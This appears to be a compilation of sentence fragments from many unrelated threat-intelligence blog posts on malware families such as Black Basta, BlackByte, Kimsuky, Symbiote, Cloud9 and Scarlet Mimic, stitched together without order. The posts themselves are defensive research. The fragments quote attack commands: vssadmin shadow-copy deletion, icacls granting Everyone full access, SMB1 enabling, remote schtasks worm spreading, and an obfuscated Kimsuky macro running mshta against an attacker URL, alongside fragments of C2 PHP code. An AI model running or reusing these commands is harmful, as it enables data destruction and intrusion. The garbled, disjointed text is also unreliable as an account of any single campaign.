0	SentinelLabs researchers describe Black Basta operational TTPs in full detail, revealing previously unknown tools and techniques.
0	SentinelLabs assesses it is highly likely the Black Basta ransomware operation has ties with FIN7.
0	Black Basta maintains and deploys custom tools, including EDR evasion tools.
0	SentinelLabs assess it is likely the developer of these EDR evasion tools is, or was, a developer for FIN7.
0	Enter the Black Basta Operator
0	This injection operation occurs every time a component of the Qakbot framework is invoked or for any arbitrary process run manually by the attacker.
0	In addition, the WMI service is leveraged to enumerate installed security solutions.
0	Black Basta Privilege Escalation Techniques
0	We have seen the use of ZeroLogon (CVE-2020-1472), NoPac (CVE-2021-42287, CVE-2021-42278) and PrintNightmare (CVE-2021-34527).
0	wmic /namespace:\ oot\SecurityCenter2 PATH AntiVirusProduct GET /value
0	wmic /namespace:\ oot\SecurityCenter2 PATH AntiSpywareProduct GET /value
0	Remote Admin Tools
0	Black Basta operators have a number of RAT tools in their arsenal.
0	Read the Full Report
0	Conclusion
0	The crimeware ecosystem is constantly expanding, changing, and evolving.
0	FIN7 (or Carbanak) is often credited with innovating in the criminal space, taking attacks against banks and PoS systems to new heights beyond the schemes of their peers.
0	Content of run.bat script
0	In other cases, we have observed the usage of Splashtop, GoToAssist, Atera Agent as well as SystemBC, which has been used by different ransomware operators as a SOCKS5 TOR proxy for communications, data exfiltration, and the download of malicious modules.
0	Black Basta Lateral Movement
0	Partial content of SERVI.bat
0	Impair Defenses
0	Left: Cobalt Strike DNS beacon; Right: BIRDDOG backdoor
0	Based on this evidence, we assess it is highly likely that this tool is specific to the Black Bastas group arsenal.
0	Please click here for Part 2
0	UPDATE 19.October.2021 - Based on some reactions and responses to our BlackByte analysis, and specifically, the included decryptor, we wanted to provide an update and some clarification.
0	First off, weve updated the decryptor on github to include two new files.
0	We thought that this ransomware was not only interesting but also quite odd:Same as other notorious ransomware variants like REvil, BlackByte also avoids systems with Russian and ex-USSR languages.
0	Figure 19: BlackByte's Onion site
0	So this claim is probably designed to scare their victims into complying.
0	So, we wrote a file decryptor that is available at this link: https://github.com/SpiderLabs/BlackByteDecryptor
0	The initial sample we analyzed can be found at this VirusTotal link and is aJScript launcher file.
0	Below is an overview diagram of the initial execution flow.
0	Below is the de-obfuscated and the beautified code:
0	Decrypting an encrypted file
0	Figure 1: JScript execution flow
0	DLL file .NET assemblies
0	Armenian (Armenia)
0	1067
0	tt-RU
0	We used a tool called MegaDumper to achieve this.
0	Turkmen
0	1090
0	ka-GE
0	vssadmin.exe resize shadowstorage /for=c: /on=c: /maxsize=401MB
0	vssadmin.exe Delete Shadows /all /quietpowershell.exe Get-CimInstance Win32_ShadowCopy | Remove-CimInstance
0	vssadmin.exe resize shadowstorage /for=c: /on=c: /maxsize=unbounded
0	vssadmin.exe resize shadowstorage /for=f: /on=f: /maxsize=unbounded
0	vssadmin.exe vssadmin.exe resize shadowstorage /for=g: /on=g: /maxsize=unbounded
0	vssadmin.exe resize shadowstorage /for=h: /on=h: /maxsize=401MB
0	netsh advfirewall firewall set rule group="File and Printer Sharing" new enable=Yes
0	powershell.exe Enable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol
0	icacls.exe" "<DRIVE LETTER>:*" /grant Everyone:F /T /C /Q
0	Figure 8: Once dumped, the decrypted .NET assemblies are saved in the drive and we can start analyzing them.
0	Below is the worm routine and execution flow:
0	Figure 10: Worm routine execution flow
0	schtasks.exe <remotehost> /TN joke /TR \"wscript.exe C:\\Users\\Public\\obamka.js\" /sc once /st 00:00 /RL HIGHEST
0	schtasks.exe /S <remotehost> /Run /TN joke
0	Figure 11: Fatal Exception Error when the ransomware failed to download the .png file
0	The file it downloaded is not actually a PNG image file, instead:
0	The first 40 bytes is the raw key used to encrypt the user's files, this is encrypted with 3DES.
0	If the file is greater than 150MB
0	Below is the code snippet of the file encryption routine.
0	struct razer_report {}
0	unsigned short remaining_packets;
0	Can you spot the problem here?
0	Hence, they suffer from the same bug.
0	Reversing
0	Our love for gaming alongside finding bugs led us back to the good ol question: Is it true that the more RGB colors you have (except for your gaming chair, of course), the more skill and power youll have over your opponents?
0	Since we are always interested in finding vulnerabilities, we have recently started to research third-party Linux kernel drivers, one of which was OpenRazer [0]  an open-source driver for gaming devices produced by Razer.
0	Finding any vulnerabilities in such a product has a significant impact due to the vast number of users.
0	We have found a buffer overflow in the OpenRazer open-source kernel drivers, which caused a Denial of Service and possibly Elevation of Privileges (CVE-2022-29021, CVE-2022-29022, CVE-2022-29023).
0	Fake MSI Afterburner Sites Delivering Coin-Miner
0	Stealthy Miner Bypasses Detection Using Shellcode and Process Injection
0	Gamers and other high-performance computing users use various utility software tools such as MSI Afterburner, which monitors system performance and allows users to modify the hardware settings to enhance the systems performance.
0	The below image shows the process tree of the XMR miner.
0	Figure 5  Process tree of XMR Miner
0	The below image shows the infection chain of the XMR miner.
0	Figure 6  XMR miner infection chain
0	XMR Miner Analysis
0	Additional information is shown in the figure below.
0	The table below shows the arguments used by the XMR miner malware.
0	MITRE ATT&CK Techniques
0	TacticTechnique IDTechnique
0	NameExecutionT1204 T1064User Execution ScriptingPersistenceT1547Registry Run Keys / Startup FolderPrivilege EscalationT1055Process InjectionDefense
0	Indicators of Compromise
0	IndicatorsIndicatorTypeDescription96a3469891a23e0aa49fd009979b668b
0	This coin-miner malware campaign uses MSI Afterburner phishing sites targeting gamers and other individuals who require high-performance computing.
0	TAs use phishing emails, online ads, and various other means to propagate links over the internet.
0	Malicious AppTargets Major Brazilian Bank ItaUnibanco
0	Android Malware is created or used by Threat Actors (TAs) to harm usersthrough various activities such as performing fraudulent financial transactionsetc.
0	Our Recommendations
0	We recommend that our readers follow the best practices given below:
0	Download and install software only from official app stores like Google Play Storeor the iOS App Store.Use a reputedanti-virus and internet security software package on your connected devices, such as PCs, laptops, and mobile devices.Use strong passwords and enforce multi-factor authentication wherever possible.
0	As we've seen with similar vulnerabilities in the past, the simplicity and efficacy of this vulnerability lends itself to rapid adoption by malware authors.
0	How Hackers Targeted The Covid-19 Vaccine Supply Chain; Vaccine Sold in Darkweb
0	Aspharmaceuticalsacross the worldrace towardsa vaccine, cybercrime continues to thrivein the underbelly of the Internet.
0	In forums on the dark web, criminalscontinue totradeenormousrepositories of criticalmedicaldatagathered throughunauthorizedmeans.As COVID-19continues todominate headlines,confidential vaccine research datageneratesenoughmonetization opportunities for cybercriminals.In addition to the COVID-19 databases containing confidentialPIIbeing leakedonthe Internet, one of the criticalsecurityconcerns is the immense cold chain logisticsof the vaccine.
0	Authors
0	Kimsuky (also known as Thallium, Black Banshee and Velvet Chollima) is a prolific and active threat actor primarily targeting Korea-related entities.
0	Like other sophisticated adversaries, this group also updates its tools very quickly.
0	In early 2022, we observed this group was attacking the media and a think-tank in South Korea and reported technical details to our threat intelligence customer.
0	Contents of decoy
0	While researching Kimsukys novel infection chain, grouped as a GoldDragon cluster, we are faced with several limitations:
0	if (isset($_GET['who']) && $_GET['who'] == "[redacted]") # Check 'who' parameter value
0	$vbs_server = "weworld59.myartsonline.com"; # The next stage server
0	$virus = "v.doc";                       # Malicious document
0	if (isset($_GET['who']) && $_GET['who'] == "[redacted]") # Check 'who' parameter
0	value{$vbs_server = "weworld59.myartsonline.com"; # The next stage server$virus = "v.doc"; # Malicious
0	C2 server structure
0	Malicious documents
0	Indicators of Compromise
0	238e6952a990fd3f6b75569feceb26a2
0	kima-2022-4- -.doc
0	8d28e28c1ee6f133441b6d71f7f8bcba
0	open.vbs
0	3361fa242eb7e6162fd4682471f4e952
0	get_info.vbs
0	Well look in more detail at how the operator uses this information in the next section.
0	function send_ip($host , $data){}
0	Looking at the corresponding script (index.php) of the above IP-delivering GET request, heres how it works.
0	";fwrite($pfile,$res);fclose($pfile);header('Location: https://mail.google.com');
0	" ;fwrite($pfile,$res);fclose($pfile);exit;}$szfilename = "error.txt";$pfile = fopen($szfilename,"ab");$res= $date .
0	$_SERVER['HTTP_USER_AGENT']."
0	CV.DHOM Alexandra Siddall (Korean).doc
0	South Korean university professor
0	The contents of decoy documents have various topics including the agenda of the 2022 Asian Leadership Conference, a form of honorarium request and an Australian diplomats curriculum vitae.
0	As we can see, the actor uses content the victim could be interested in, such as an event to be held in the near future, a specific request form, and the resume of a high-profile individual.
0	Decoy documents
0	Malicious document and method of delivering next stage payload
0	The following scriptlet is part of a malicious macro in the document.
0	cmd = "c" + "md /" + "c c" + "md /" + "c cm" + "d /" + "c c" + "m" + "d /" + "c c" + "md /" + "c c" + "md /" + "c msht" + "a.e" + "xe hxxp://leehr24.mywebcommunity[.]org/h.php"
0	$downfile = "h.txt";
0	$logfile = "log.txt";
0	");fclose($handle);if(file_exists($allow_file)){$fp = fopen($allow_file,"r");$content = fread($fp, filesize($allow_file));fclose($fp);if(!stristr($content,$ip )){  echo 'Set objShell = CreateObject("Wscript.shell")objShell.run "TASKKILL /F /IM mshta.exe" , 0 , False';  exit;}}
0	ProgramFilesFolder = objShell.ExpandEnvironmentStrings("%ProgramFiles%")
0	Email name
0	Suspected email
0	Delivered file name
0	Email owner
0	yk****@***.ac.kr
0	Set shell_obj = CreateObject("WScript.Shell")
0	ini_file =
0	jung******
0	jung******@gmail.com
0	Professor of South Korea university
0	jh******@****.ac.kr
0	([Template]Pay honorarium.doc)
0	Also, historically, politicians, diplomats, journalists, professors, and North Korean defectors have been prime targets of the Kimsuky group.
0	FortiGuard Labs has observed similar drastic modifications within RapperBot samples, as detailed in our previous report, adding and removing even DoS attack code on an apparent whim.
0	The Telnet brute forcing code is designed primarily for self-propagation and resembles the old Mirai Satori botnet.
0	Function initializing the credential list
0	While not exactly a novel technique, it is still uncommon compared to other IoT botnets.
0	Figure 2.Gaining root access on devices with a default password
0	After FortiGuard Labs reported on RapperBot in our previous article titled So RapperBot, What Ya Bruting For?
0	in August 2022, there was a significant drop in the number of samples collected in the wild.
0	But in early October 2022, new samples with the same distinctive C2 protocol used by RapperBot were detected.
0	We also found older samples from another campaign that was active in August-September 2021 with an almost identical list of credentials.
0	Timeline of related campaigns
0	Researchers observed that the attacker had already gained access to privileged credentials from a prior compromise, for the targeted networks to deploy the ransomware.
0	As of now, this campaign did not find any tangible connection to a known threat actor attempting to deploy ransomware into the networks of Ukrainian enterprises.
0	Or, to any of the existing ransomware groups that may be related to earlier recent attacks conducted by Russia-linked threat actors.
0	What we have observed in this and the previous campaigns:
0	Some of the victims were previously targeted with HermeticWiper which was discovered in Ukraine.
0	STATIC ANALYSIS
0	SHA256: 5fc44c7342b84f50f24758e39c8848b2f0991e8817ef5465844f5f2ff6085a5
0	File Type
0	As shown below.
0	Threat actors behind ransomware attacks do not always have one goal of extorting money from victims.
0	As is the case with other ransomware, it might be inconclusive at this stage to assess the damage Prestige ransomware has caused.
0	There is a significant uptick in discussions and mentions observed around Prestige ransomware which may mean that the infection footprint is sizeable and possibly continues to expand.
0	The activity observed around the sample analyzed shares victimology with recent Russian state-threat actor groups, in the targeted geographies, and in some cases overlaps with victims of HermeticWiper.
0	As the external threat landscape continues to evolve, wipers and destructive attacks not only in Ukraine but also in other geopolitically motivated attacks will continue to be a consistent component in such attacks.
0	List of IOCs
0	Dynamic Analysis
0	(Japanese)Unit 42 researchers have been tracking the threat group AridViper, which has been targeting the Middle Eastern region.
0	This is an interesting finding, as we have not witnessed AridViper targeting these operating systems before and this could represent a new area the actor is starting to explore.For now, the code found is very simple, and could be part of a copy and paste effort when building the Python code, but in any case, we plan to keep it on our radar while researching new activity.During the C2 interactions, PyMICROPSIA downloads two additional samples that are dropped and executed on the victims system, running additional functionality.
0	Based on the code sections that are reachable, the following table summarizes the commands and actions performed on the victim machine:Table 2.
0	Main purpose of configuration folders and files.Devices are identified based on a combination of computer name, username and a randomly generated code.
0	2022 Palo Alto Networks, Inc. All rights reserved.
0	As an interesting fact, the commands are full of references to Disney (in the past, we have seen AridViper using variables referencing characters of The Big Bang Theory or Game of Thrones, for example).Another interesting example of incomplete code is the fact that the code wont be able to go through all the possible branches and functionality in the C2 implementation.
0	Data is stored under the DevNameSound folder.The recordings are stored in the corresponding folder, and the running threads as well as the operator commands will allow for the retrieval of the information captured.
0	These commands are split by a specific delimiter ; in this sample, travelling encoded in base64.
0	The sample has different options implemented, allowing the operators very flexible execution of commands such as download and execution of payloads from a given URL, process execution, etc.Sign up to receive the latest news, cyber threat intelligence and research from usPlease enter your email address!Please mark, I'm not a robot!By submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement.
0	The code looks as follows:Table 5.
0	The methods are invoked based on different interactions with the C2 operator, and they give the operators flexibility on what kind of information they want to collect.For example, there are generic methods to collect specific folders and with different levels of information detailed, as can be seen in several of the figures below.There are methods to collect information from external drives:As well as other approaches, such as methods to focus on specific file extensions.File operators have plenty of commands that allow different types of files to be collected from disk.
0	Based on its value, it can download specific payloads as well as given URLs.
0	AT&T Alien Labs has been tracking a new IoT botnet dubbed EnemyBot, which is believed to be distributed by threat actor Keksec.
0	During our investigations, Alien Labs has discovered that EnemyBot is expanding its capabilities, exploiting recently identified vulnerabilities (2022), and now targeting IoT devices, web servers, Android devices and content management system (CMS) servers.
0	enemy.c
0	This is the main bot source code.
0	Though it is missing the main exploitation function, it includes all other functionality of the malware and the attacks the bot supports by mixing the various botnet source codes as mentioned above (Mirai, Qbot, and Zbot)  mainly Mirai and Qbot (see figure 5).
0	Figure 5.EnemyBot source code.
0	This module is compiled and manually executed to encode / decode the malwares strings by the attacker to hide strings in binary.
0	EnemyBot "adb_infect" function to attack Android devices.
0	Command
0	Action
0	They can be used by readers to tune or deploy detections in their own environments or for aiding additional research.
0	The Zscaler ThreatLabz team has recently discovered the Xenomorph banking trojan embedded in a Lifestyle app in the Google Play store.
0	The app is Todo: Day manager, and has over 1,000 downloads.
0	This is the latest in a disturbing string of hidden malware in the Google Play store: in the last 3 months, ThreatLabz has reported over 50+ apps resulting in 500k+ downloads, embedding such malware families as Joker, Harly, Coper, and Adfraud.
0	Fig no 1.Malware Installer From Play Store
0	A similar infection cycle was observed three months ago with the Coper banking trojan.
0	Technical Details
0	Fig no 2.Flow of infection
0	Fig no 4.Downloader not enabled.
0	Fig no 3.
0	The following screenshot shows how the Firebase database malware uses Github links to download Xenomorph payloads:Fig no 5.
0	Insights and Research
0	Security Research
0	ThreatLabz is working with the Google Security team for the same.
0	Suspicious Installer exhibiting the same behavior
0	Xenomorph banking trojan
0	At Zscaler we proactively detect and monitor such applications to secure our clients.
0	Such bank phishing installers most of the time rely on tricking users to install malicious applications.
0	Users are advised to keep an eye on what application is being installed.
0	A Play Store application is not supposed to side load or ask users to install from unknown sources.
0	In late June 2022, HP Wolf Security isolated an unusually stealthy malware campaign that used OpenDocument text (.odt) files to distribute malware.
0	OpenDocument is an open, vendor-neutral file format compatible with several popular office productivity suites, including Microsoft Office, LibreOffice and Apache OpenOffice.
0	As described in a blog post by Cisco Talos, the campaign targets the hotel industry in Latin America.
0	The targeted hotels are contacted by email with fake booking requests.
0	In the case below, the attached document was purportedly a guest registration document.
0	Figure 1  Email lure making a booking request.
0	Infection chain
0	Figure 2  OpenDocument file asking to update fields in the document.
0	Figure 3  Excel spreadsheet asking the user to enable macros.
0	Strikingly, the document used in the campaign is poorly detected by anti-virus scanners, with a 0% detection rate on VirusTotal as of 7 July.
0	Figure 4  OpenDocument VirusTotal detection.
0	Figure 5  OpenDocument referencing external document.
0	Figure 6  Externally referenced Word document contains 10 Excel files.
0	Attackers are always hunting for stealthy ways of delivering malware that evades endpoint security.
0	This campaign illustrates how OpenDocument text files can be abused to deliver malware through external OLE references with extremely low detection rates.
0	Documents that arrive from outside an organization should always be treated with suspicion, especially if they try to load external content from the web  but in practice this isnt always straightforward advice to follow, especially in industries that rely on exchanging electronic documents between suppliers and clients.
0	This research is a joint effort between Joakim Kennedy, Security Researcher at Intezer, and the BlackBerry Threat Research & Intelligence team.
0	It can be found in the BlackBerry blog here as well.
0	In biology, a symbiote is an organism that lives in symbiosis with another organism.
0	The symbiosis can be mutually beneficial to both organisms, but sometimes it can be parasitic when one benefits and the other is harmed.
0	A few months back, we discovered a new, undetected Linux malware that acts in this parasitic nature.
0	We have aptly named this malware Symbiote.
0	What makes Symbiote different from other Linux malware that we usually come across, is that it needs to infect other running processes to inflict damage on infected machines.
0	Our earliest detection of Symbiote is from November 2021, and it appears to have been written to target the financial sector in Latin America.
0	In our research, we havent found enough evidence to determine whether Symbiote is being used in highly targeted or broad attacks.
0	The image below shows a summary of the malwares evasions.
0	This logic is used in all hooked functions.
0	An example is shown in Figure 2 below.
0	The files extracted from all the samples we examined are shown in the list below.
0	The list includes the following files.
0	Symbiote also has functionality to hide network activity on the infected machine.
0	Essentially, this gives the calling process a scrubbed result, which excludes all entries of the network connections that the malware wants to hide.
0	This minimizes the context switching between kernel and userland, providing a performance boost since the kernel performs the filtering directly.
0	Code Snippet 1: Annotated bytecode extracted from one of the Symbiote samples.
0	The pcap_stats uses this counter to correct the number of packets processed by subtracting the counter value from the true number of packets processed.
0	Either option suggests that this malware was written by a skilled developer.
0	The BlackBerry Research & Intelligence team examines emerging and persistent threats, providing intelligence analysis for the benefit of defenders and the organizations they serve.
0	To make the analysis easier he has written the Go Reverse Engineering Toolkit (github.com/goretk), an open-source toolkit for analysis of Go binaries.
0	For the last few years, Joakim has been researching malware written in Go.
0	Dr. Joakim Kennedy is a Security Researcher analyzing malware and tracking threat actors on a daily basis.
0	Network telemetry can be used to detect anomalous DNS requests and security tools such as antivirus (AVs) and endpoint detection and response (EDRs) should be statically linked to ensure they are not infected by userland rootkits.
0	This method is used to filter out UDP packets, while the bytecode method is used to filter out TCP packets.
0	By using all three of these methods, the malware ensures that all traffic is hidden.
0	The A record request has the following format:
0	Code Snippet 2: Structure of DNS request used by Symbiote to exfiltrate data.
0	The TXT record has the format of %MACHINEID%.%C2_DOMAIN%.
0	Figure 4 below shows a timeline of these events.
0	In 2014, ESET released an in-depth analysis of Ebury, an OpenSSH backdoor that also performs credential stealing.
0	When we first analyzed the samples with Intezer Analyze, only unique code was detected (Figure 5).
0	There are some similarities in the techniques used by both malware families.
0	Figure 3 below shows the code executed.
0	The domain names used by the Symbiote malware are impersonating some major Brazilian banks.
0	Cintepol is an intelligence portal provided by the Federal Police of Brazil.
0	The portal allows police officers to access different databases provided by the federal police as part of their investigations.
0	Additionally, a version that appears to be under development was submitted at the end of November from Brazil, further suggesting VirusTotal was being used by the threat actor or group behind Symbiote for detection testing.
0	Symbiote is not the first Linux malware developed for this goal.
0	Dr. Joakim Kennedy is a Security Researcher analyzing malware and tracking threat actors on a daily basis.
0	Spread this blogWeb browsers contain the most lucrative pieces of information about a user and thus are becoming an interesting target for malware developers.
0	Every keystroke or session cookie can contain very private information about a user, and access to such information can create critical security and privacy issues.
0	Figure 1: manifest.json
0	Figure 2: Installed chrome extension on Google Chrome.
0	This not only diminishes the performance of the device but reduces hardware lifespan and increases energy usage, which translates into a slow but steady monetary loss.
0	Figure 3: cthulhu.js code that drops the malware.
0	It has the following functionalities:
0	Figure 4: campaign.js code that steals cookies.
0	Stealing Clipboard Data
0	This behavior can be especially dangerous in cases where the user stores password in any password manager and copies and pastes the password or other sensitive information in the infected browser session.
0	Figure 5: campaign.js code that steals clipboard data.
0	3.Exploit
0	We already mentioned the Firefox exploit that was used to drop a malicious exe file.
0	4.POST requests and layer 7 attack
0	The Threat Actors
0	The origin of this malware comes from the Keksec malware group, which was originally formed in 2016 by some botnet actors.
0	The first public release of this JavaScript botnet was found in 2017, and it was updated again in 2020, where it was spread as a single JavaScript that can be included on any website using script tags.
0	The command and control servers used by the Cloud9 Chrome botnet point to domains that were previously used by the Keksec malware group.
0	The Cloud9 botnet is being sold either for free or for a few hundred dollars on various different hacker forums.
0	As it is quite trivial to use and available for free, it can be used by many malware groups or individuals for specific purposes.
0	How does Cloud9 Impact Enterprise Clients?
0	This malware is purposefully designed to target all kinds of users and serves its purpose of retrieving user information.
0	Previous BlogNext Blog
0	Exploit Guard  Module that delivers behavior-based detection and prevention against exploits and payloads.
0	The combination of signature-based, machine-learning based, and behavioral-based protection capabilities, the UAC Protect module, and the Process Guard module for Trellix Endpoint Security provide maximum protection for customers.
0	Figure 15: Trellix NX MVX analysis of HermeticWiper
0	The report provides an in-depth forensics data of all behaviors discovered during analysis.
0	This activity was reported by Googles TAG and attributed to the infamous APT28 aka Fancy Bear threat actor, known for its ties with the Russian GRU.
0	It offers comprehensive email security against malicious attachments, credential-phishing URLs, spoofing, zeroday and multi-stage attacks.
0	The OS change report includes:
0	File and folder actions
0	Windows Registry events
0	It is imperative that security teams have visibility into what's happening across the business so they can respond to and investigate security incidents including destructive wiper attacks.
0	Trellix Helix can analyze events in over 650 security and business tools and is enriched with Trellix expertise to identify the threats happening in an organization.
0	Figure 24: Alerts correlation in Helix XDR
0	Cyber warfare weapons (including destructive wipers) will be part of every geopolitical conflict.
0	Hong Kong pro-democracy radio station website compromised to serve a Safari exploit that installed cyberespionage malware on site visitors Macs
0	On November 11th, Google TAG published a blogpost about watering-hole attacks leading to exploits for the Safari web browser running on macOS.
0	Its value is fetched from JavaScript using its toString method.
0	Detailing the fake object creation would require an article of its own.
0	Our examination confirms Googles analysis that the exploited vulnerability was described by Xinru Chi and Tielei Wang in a presentation at zer0con 2021, but it was also presented in more details at MOSEC 2021 by Tielei Wang.
0	The vulnerability has been assigned CVE-2021-30869.
0	DazzleSpy is a full-featured backdoor that provides attackers a large set of functionalities to control, and exfiltrate files from, a compromised computer.
0	The WebKit exploit
0	Its interesting to note that some code, which suggests the vulnerability could also have been exploited on iOS and even on PAC-enabled (Pointer Authentication Code) devices such as the iPhone XS and newer, has been commented out, as seen in Figure 5.
0	-----BEGIN CERTIFICATE-----
0	MIIDTDCCAjQCCQCSgwC5KEoeDjANBgkqhkiG9w0BAQsFADBoMQswCQYDVQQGEwIx
0	T1584.004Compromise Infrastructure: ServerA legitimate website was compromised to add an  iframe  loading malicious JavaScript code.
0	T1587.003Develop Capabilities: Digital CertificatesDazzleSpy verifies the authenticity of its C&C server using an X.509 certificate.
0	Serial Number: 10557282746731470350 (0x928300b9284a1e0e)
0	Filenames
0	95889E0EF3D31367583DD31FB5F25743FE92D81DN/AOSX/Exploit.Agent.CMach-O file with LPE launching next stage.
0	Indicators of Compromise (IoCs)
0	Given the complexity of the exploits used in this campaign, we assess that the group behind this operation has strong technical capabilities.
0	While there is information published online about the local privilege escalation (LPE) vulnerability used here, we couldnt find anything about the specific WebKit vulnerability used to gain code execution in Safari.
0	Its also interesting that end-to-end encryption is enforced in DazzleSpy and it wont communicate with its C&C server if anyone tries to eavesdrop on the unencrypted transmission by inserting a TLS-inspection proxy between the compromised system and the C&C server.
0	It records a wide range of information:
0	Generic system information :
0	list of volumes, their serial number and FileSystem name
0	if the victim has installed mobile telephone applications (Nokia PC Suite, Sony Ericson PC Suite), this information will be present
0	The discovery of Stuxnet back in 2010 sparked intense debate on the state of security in cyber-space.
0	But, even though Stuxnet has been successfully identified, isolated and dealt with, its predecessor (and companion, as well) has managed to remain undetected all this time by employing stunning tactics that likely make it the most advanced e-threat in the world to date.
0	When state-of-the-art malware detection works against intelligence gathering
0	This new e-threat, identified by Bitdefender as Trojan.Flamer.A appears to have emerged before Stuxnet and Duqu hit.
0	All this time, it has operated discreetly, and even if it some of its components were detected when Stuxnet was discovered, the AV industry couldnt see how deep the operation ran.
0	On average, between 15,000 and 35,000 unique malware samples appear daily, which makes manual analysis or individual identification technically unfeasible.
0	Most antivirus vendors rely on generic detections and heuristics to cover as much as possible of this malicious pool.
0	At a glance, the Flamer.A Trojan appears much more advanced than Stuxnet.
0	7 Years of Scarlet Mimics Mobile Surveillance Campaign Targeting Uyghurs
0	September 22, 2022
0	In 2022, Check Point Research (CPR) observed a new wave of a long-standing campaign targeting the Uyghur community, a Turkic ethnic group originating from Central Asia, one of the largest minority ethnic groups in China.
0	This malicious activity, which we attributed to the threat actor Scarlet Mimic, was first brought to light back in 2016.
0	Since then, CPR has observed the group using more than 20 different variations of their Android malware, disguised in multiple Uyghur-related baits such as books, pictures, and even an audio version of the Quran, the holy text of the Islamic faith.
0	The malware is relatively unsophisticated from a technical standpoint.
0	Overview of the campaign
0	Since 2015, CPR has identified more than 20 samples of Android spyware called MobileOrder, with the latest variant dated mid-August 2022.
0	As there are no indications that any of them were distributed from the Google Store, we can assume the malware is distributed by other means, most likely by social engineering campaigns.
0	Figure 5  The service that starts the Communication and KeepAlive threads.
0	However, the KeepAlive thread is not the only one responsible for keeping the malware active.
0	Figure 6  AndroidManifest.xml specifying triggers for the BroadcastReceiver which is responsible for keeping the malware alive.
0	Dead drop resolvers
0	Figure 9  The code responsible for regex pattern matching of the dead drop resolvers.
0	Encryption
0	Command execution
0	Upload all SMS messages.
0	Upload all Call Logs.
0	Take a photo from the camera.
0	Start Audio Recording task (immediately or at a specified time).
0	As we can see from this list, the malware contains stealer functionality to upload all kinds of sensitive data from the device (device info, SMS, calls, location, etc.
0	However, there is no automatic upload for the recorded calls.
0	For example, one set of coordinates can be translated to the full street address of the closest building, while another might contain only a city name and a postal code.
0	Most of the malicious applications we observed have names in the Uyghur language, in its Arabic or Latin scripts.
0	We can therefore conclude that this campaign is likely intended to target the Uyghur minority or organizations and individuals supporting them, which is consistent with the Scarlet Mimic groups previously reported activity.
